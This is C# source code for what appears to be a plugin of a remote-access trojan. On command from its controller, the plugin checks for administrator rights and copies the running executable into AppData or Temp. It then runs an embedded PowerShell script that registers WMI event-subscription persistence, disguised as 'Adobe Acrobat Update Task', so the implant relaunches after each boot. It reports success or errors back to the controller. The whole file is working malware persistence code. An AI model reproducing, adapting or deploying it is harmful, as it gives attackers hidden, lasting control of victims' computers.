using MessagePackLib.MessagePack;
using System;
using System.Text;
using System.Threading;
using System.Management.Automation.Runspaces;
using System.Security.Principal;
using System.Diagnostics;
using System.IO;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "wmibackdoor":
                        {
                            WmiBackdoor();
                            Connection.Disconnected();
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void PSLoader(string script)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            Pipeline pipeline = rs.CreatePipeline();
            pipeline.Commands.AddScript(script);
            pipeline.Invoke();
            rs.Close();
        }

        public static void WmiBackdoor()
        {
            if (!IsHighIntegrity())
            {
                Log(Connection.Hwid + ":[-] Not in high integrity!");
                return;
            }
            
            string name = Process.GetCurrentProcess().ProcessName + ".exe";

            string filepath;
            try
            {
                filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
            }
            catch
            {
                filepath = Path.Combine(Path.GetTempPath(), name);
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
            }

            string script = @"
$wmiParams = @{
    ErrorAction = 'Stop'
    NameSpace = 'root\subscription'
}

$wmiParams.Class = '__EventFilter'
$wmiParams.Arguments = @{
    Name = 'Adobe Acrobat Update Task'
    EventNamespace = 'root\CIMV2'
    QueryLanguage = 'WQL'
    Query = ""SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 1200""
}
$filterResult = Set-WmiInstance @wmiParams

$wmiParams.Class = 'CommandLineEventConsumer'
$wmiParams.Arguments = @{
    Name = 'Adobe Acrobat Update Task'
    ExecutablePath = """ + filepath + @"""
}
$consumerResult = Set-WmiInstance @wmiParams

$wmiParams.Class = '__FilterToConsumerBinding'
$wmiParams.Arguments = @{
    Filter = $filterResult
    Consumer = $consumerResult
}

$bindingResult = Set-WmiInstance @wmiParams
            ";
            try
            {
                PSLoader(script);
                Log(Connection.Hwid + ":[+] WMI Backdoor Success!");
            }
            catch(Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}